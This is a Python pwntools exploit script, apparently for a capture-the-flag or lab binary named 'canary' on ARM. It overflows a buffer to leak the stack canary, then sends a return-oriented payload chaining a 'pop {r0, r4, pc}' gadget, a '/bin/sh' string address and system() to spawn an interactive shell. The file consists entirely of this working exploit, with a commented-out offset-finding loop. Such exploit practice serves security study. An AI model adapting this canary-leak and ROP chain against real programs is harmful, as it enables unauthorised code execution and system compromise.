#!/usr/bin/python
from pwn import *
"""
def find_offset():
    for i in range(0x10, 0x100):
        s = process("./canary")
        s.sendlineafter("> ", "A"*i)
        s.sendlineafter("> ", "\n")
        reply = s.recv()
        print (reply)
        s.close()
        if "***" in reply:

            print ("Crashing canary at offset: {}".format(i))
            return reply,i
"""
offset = 41
s = process("./canary")
s.sendafter("> ", "A"*offset)
s.recvuntil("A"*offset)
reply = s.recv(3)
canary = u32("\x00" + reply)
log.info("Canary: {}".format(hex(canary)))

system = 0x16d90
bin_sh = 0x00071eb0	
gadget = 0x00026b7c         # pop {r0, r4, pc}  r0 is the first argument
payload = "A"*40
payload += p32(canary)
payload += "B"*(0x10-4)     # offset from canary to stack base pointer is 0x10 => return address is 0x10-4
payload += p32(gadget)
payload += p32(bin_sh)
payload += "CCCC"           # filler bytes for r4
payload += p32(system)
s.sendline(payload)
s.sendline("")              # trigger the break condition in the loop to terminate the loop
s.interactive()


